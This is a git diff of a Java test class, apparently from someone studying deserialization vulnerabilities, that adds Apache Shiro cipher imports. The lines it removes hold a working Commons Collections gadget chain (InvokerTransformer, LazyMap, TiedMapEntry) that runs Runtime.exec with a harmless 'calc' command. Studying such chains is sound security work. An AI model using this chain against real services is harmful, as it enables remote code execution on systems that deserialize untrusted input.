@@ -8,6 +8,8 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.util.ByteSource;
 import org.jetbrains.annotations.Async;
 
 import javax.xml.ws.soap.Addressing;
@@ -45,42 +47,5 @@ public class TestClass {
     }
 
     public static void main(String[] args) throws Exception {
-//
-//        Class c = Runtime.class;
-//        Method getRuntime = c.getMethod("getRuntime", null);
-//        Object invoke = getRuntime.invoke(null, null);
-//        Method exec = c.getMethod("exec", String.class);
-//        exec.invoke(invoke,"calc");//在invoke这个对象上调用exec执行calc方法
-
-//        Method invokerTransformer1 = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}).transform(Runtime.class);
-//        Runtime invoke = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}).transform(invokerTransformer1);
-//        new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc" }).transform(invoke);
-
-
-
-        Transformer[] transformers = new Transformer[]{
-                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
-                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
-                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc"}),
-        };
-        ChainedTransformer chainedTransformer =new ChainedTransformer(transformers);//通过调用Runtime的exec来命令执行
-
-        Map map = new HashMap();
-
-        Map decorate = LazyMap.decorate(map,new ConstantTransformer(1));
-
-
-        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, Runtime.class);
-
-        HashMap kvHashMap = new HashMap<>();
-        kvHashMap.put(tiedMapEntry,"bbb");
-        decorate.clear();
-
-        Field clazz = Class.forName("org.apache.commons.collections.map.LazyMap").getDeclaredField("factory");
-        clazz.setAccessible(true);
-        clazz.set(decorate,chainedTransformer);
-
-//        serialization(kvHashMap);
-        unserialization();
     }
 }
